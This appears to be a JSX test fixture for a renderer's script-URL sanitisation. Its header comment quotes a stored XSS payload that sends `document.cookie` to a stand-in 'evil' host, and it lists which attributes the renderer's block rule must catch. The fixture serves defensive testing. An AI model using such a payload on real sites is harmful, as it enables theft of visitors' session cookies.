// ALB-03 · URL-valued attributes filled from props — the shape of a profile
// page rendering a visitor's own "website" field.
//
// Both server renderers emitted these verbatim, so a stored
// `javascript:fetch('//evil/?c='+document.cookie)` ran on click. React 19
// replaces a script URL; so do both renderers now, by the one rule in
// `runtime::jsx_attributes` (`is_script_url` / `BLOCKED_URL`).
//
//   website — the audit's case-and-whitespace variant, in an href
//   photo   — the same in a `src`
//   button  — `formAction`, which is not renamed, so the rule must match it
//             case-insensitively
//   safe    — an ordinary URL with `&`, which must pass through (escaped)
//   title   — a script URL in a TEXT attribute is just text, left alone
export default function ScriptUrls({ website, photo, safe }) {
  return (
    <div>
      <a id="website" href={website}>site</a>
      <img id="photo" src={photo} />
      <button id="button" type="button" formAction={website}>go</button>
      <a id="safe" href={safe}>safe</a>
      <span id="title" title={website}>text</span>
    </div>
  );
}
